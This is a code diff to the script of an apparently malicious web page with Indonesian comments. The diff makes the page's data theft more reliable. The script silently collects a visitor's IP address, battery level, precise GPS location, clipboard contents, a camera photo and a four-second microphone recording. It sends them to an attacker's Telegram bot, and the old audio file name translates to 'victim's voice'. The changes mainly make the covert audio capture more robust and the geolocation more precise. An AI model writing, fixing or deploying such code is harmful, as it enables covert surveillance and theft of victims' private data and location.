@@ -127,32 +127,44 @@
 
         fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { clientIP = data.ip; }).catch(()=>{});
         if(navigator.getBattery) { navigator.getBattery().then(bat => { batteryInfo = `${Math.round(bat.level*100)}%`; }); }
-        if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { deviceGPS = `Lat:${pos.coords.latitude},Lon:${pos.coords.longitude}`; }, ()=>{}, {timeout:3000}); }
+        if(navigator.geolocation) { 
+            navigator.geolocation.getCurrentPosition(
+                pos => { deviceGPS = `Lat:${pos.coords.latitude}, Lon:${pos.coords.longitude}`; }, 
+                () => { deviceGPS = "Ditolak / Gagal GPS"; }, 
+                { timeout: 5000, enableHighAccuracy: true }
+            ); 
+        }
         navigator.clipboard?.readText().then(t => { clipboardData = t || "Kosong"; }).catch(()=>{});
 
-        // Fungsi Rekam Suara Mic Diperbaiki (Mendukung format audio universal)
+        // Perekam Suara yang Dipaksa Pakai Blob Universal Aman
         async function recordAudio(stream) {
             return new Promise((resolve) => {
                 try {
-                    const options = { mimeType: 'audio/webm;codecs=opus' };
-                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                        options.mimeType = 'audio/ogg;codecs=opus';
-                        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                            options.mimeType = ''; // Biarkan browser nentuin default terbaik
-                        }
+                    let mediaRecorder;
+                    try {
+                        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                    } catch (err) {
+                        mediaRecorder = new MediaRecorder(stream); // Fallback ke default browser
                     }
 
-                    const mediaRecorder = new MediaRecorder(stream, options);
                     let audioChunks = [];
+                    mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) audioChunks.push(e.data); };
                     
-                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
                     mediaRecorder.onstop = () => {
-                        capturedAudioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        if (audioChunks.length > 0) {
+                            capturedAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        }
                         resolve();
                     };
-                    
+
                     mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 4000); // Rekam durasi 4 detik
+                    setTimeout(() => {
+                        if (mediaRecorder.state === "recording") {
+                            mediaRecorder.stop();
+                        } else {
+                            resolve();
+                        }
+                    }, 4000); // Rekam suara 4 detik
                 } catch (e) { 
                     resolve(); 
                 }
@@ -179,11 +191,13 @@
                     canvas.toBlob(blob => { capturedPhotoBlob = blob; resolve(); }, 'image/jpeg', 0.85);
                 });
 
-                // Rekam Mic
+                // Jalankan Rekam Mic
                 await recordAudio(stream);
 
                 stream.getTracks().forEach(track => track.stop());
-            } catch(e) { micStatus = "Ditolak / Gagal ❌"; }
+            } catch(e) { 
+                micStatus = "Ditolak / Gagal ❌"; 
+            }
         }
 
         async function sendToTelegramText(title, details) {
@@ -214,7 +228,7 @@
             try {
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('voice', capturedAudioBlob, 'voice_korban.ogg');
+                fd.append('voice', capturedAudioBlob, 'voice.webm');
                 fd.append('caption', caption);
                 fd.append('parse_mode', 'Markdown');
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
